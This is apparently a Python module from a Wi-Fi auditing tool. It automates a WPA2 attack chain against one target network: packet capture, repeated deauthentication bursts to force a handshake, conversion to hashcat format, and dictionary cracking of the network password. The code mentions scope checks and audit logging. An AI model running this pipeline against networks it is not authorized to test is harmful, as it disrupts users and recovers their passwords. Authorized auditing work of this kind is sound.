"""One-click 'Auto' mode: chains the whole WPA2 pipeline for a single
scope-authorized target in one background thread, so an operator doesn't have
to drive five tabs by hand:

    capture  ->  deauth (force a handshake)  ->  convert  ->  hashcat crack

It ONLY orchestrates the existing capture/deauth/crack managers — no new tool
wrapping — and logs every phase to the audit trail, so the guardrails
(scope-gate + logging) stay intact. The API layer scope-checks the BSSID before
start(). WPA3-only (SAE) targets are rejected up front: their handshake is not
crackable by this dictionary method, so auto-running would only waste time.
"""

import threading
import time
from dataclasses import asdict, dataclass
from pathlib import Path

from app import logging_db
from app.capture import CaptureCommandError, capture_manager
from app.crack import crack_manager
from app.deauth import deauth_manager

# terminal phases: done / failed / stopped
PHASES = ("idle", "capturing", "converting", "cracking", "done", "failed", "stopped")


def looks_like_wpa3_only(encryption: str | None) -> bool:
    """True for a network advertising WPA3/SAE with no WPA2 fallback. A
    WPA2/WPA3 transition network still exposes a crackable WPA2 handshake, so
    only pure-WPA3 is rejected."""
    if not encryption:
        return False
    e = encryption.upper()
    return ("WPA3" in e or "SAE" in e) and "WPA2" not in e and "PSK" not in e


@dataclass
class AutoState:
    running: bool
    phase: str
    interface: str | None
    bssid: str | None
    channel: str | None
    wordlist: str | None
    detail: str
    hashes: int
    psk: str | None
    error: str | None


class AutoManager:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._state = AutoState(
            running=False, phase="idle", interface=None, bssid=None, channel=None,
            wordlist=None, detail="", hashes=0, psk=None, error=None,
        )

    def _set(self, **kw) -> None:
        with self._lock:
            for k, v in kw.items():
                setattr(self._state, k, v)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def start(
        self, interface: str, bssid: str, channel: str, wordlist: str,
        deauth_count: int = 8, capture_seconds: int = 60,
    ) -> None:
        with self._lock:
            if self._thread and self._thread.is_alive():
                raise RuntimeError("An auto run is already in progress")
            if not Path(wordlist).is_file():
                raise CaptureCommandError(f"Wordlist not found: {wordlist}")
            self._stop_event.clear()
            self._state = AutoState(
                running=True, phase="capturing", interface=interface, bssid=bssid,
                channel=channel, wordlist=wordlist, detail="starting capture", hashes=0,
                psk=None, error=None,
            )
            self._thread = threading.Thread(
                target=self._run, args=(interface, bssid, channel, wordlist, deauth_count, capture_seconds),
                daemon=True,
            )
            self._thread.start()

    def _run(self, interface, bssid, channel, wordlist, deauth_count, capture_seconds) -> None:
        try:
            logging_db.log_action("auto-start", bssid, "success", detail=f"channel={channel}")
            capture_manager.start(interface, bssid, channel)
            self._set(phase="capturing", detail="capturing — sending deauth bursts to force a handshake")

            hashes = 0
            deadline = time.monotonic() + capture_seconds
            while time.monotonic() < deadline and not self._stop_event.is_set():
                try:
                    deauth_manager.start(interface, bssid, deauth_count, None, channel)
                    logging_db.log_action("auto-deauth", bssid, "success", detail=f"count={deauth_count}")
                except Exception:  # deauth is best-effort; capture can still land a PMKID
                    pass
                for _ in range(6):
                    if self._stop_event.is_set():
                        break
                    time.sleep(1)
                    hashes = capture_manager.status().hashes
                    self._set(hashes=hashes)
                    if hashes > 0:
                        break
                if hashes > 0:
                    break

            capture_manager.stop()
            if self._stop_event.is_set():
                self._set(running=False, phase="stopped", detail="stopped by operator")
                logging_db.log_action("auto-stop", bssid, "success")
                return
            if hashes == 0:
                msg = "No handshake/PMKID captured in time — client may be idle. Try a longer window or rerun."
                self._set(running=False, phase="failed", error=msg)
                logging_db.log_action("auto-capture", bssid, "error", detail=msg)
                return

            self._set(phase="converting", detail="extracting .hc22000")
            hash_file = capture_manager.convert_to_hashcat_format()
            logging_db.log_action("auto-convert", bssid, "success", detail=str(hash_file))

            self._set(phase="cracking", detail=f"cracking with {Path(wordlist).name}")
            logging_db.log_action("auto-crack", bssid, "success", detail=f"wordlist={wordlist}")
            crack_manager.start("hashcat", bssid, wordlist, str(hash_file))
            while crack_manager.is_running():
                if self._stop_event.is_set():
                    crack_manager.stop()
                    self._set(running=False, phase="stopped", detail="stopped by operator")
                    logging_db.log_action("auto-stop", bssid, "success")
                    return
                time.sleep(2)
                st = crack_manager.status()
                self._set(psk=st.psk, detail=f"{st.progress_pct or 0}% @ {st.speed or '…'}")
                if st.psk:
                    break

            final = crack_manager.status()
            if final.psk:
                self._set(running=False, phase="done", psk=final.psk, detail="password recovered")
                logging_db.log_action("auto-recovered", bssid, "success", detail="PSK recovered")
            else:
                msg = "Wordlist exhausted — password not in this list. Try a bigger list or rules/mask mode."
                self._set(running=False, phase="failed", error=msg)
                logging_db.log_action("auto-crack", bssid, "error", detail=msg)
        except CaptureCommandError as exc:
            self._set(running=False, phase="failed", error=str(exc))
            logging_db.log_action("auto-failed", bssid, "error", detail=str(exc))
        except Exception as exc:  # never let the worker thread die silently
            self._set(running=False, phase="failed", error=str(exc))
            logging_db.log_action("auto-failed", bssid, "error", detail=str(exc))

    def stop(self) -> None:
        self._stop_event.set()
        capture_manager.stop()
        try:
            deauth_manager.stop()
        except Exception:
            pass
        crack_manager.stop()
        self._set(running=False, phase="stopped", detail="stopped by operator")

    def status(self) -> AutoState:
        with self._lock:
            return AutoState(**asdict(self._state))


auto_manager = AutoManager()
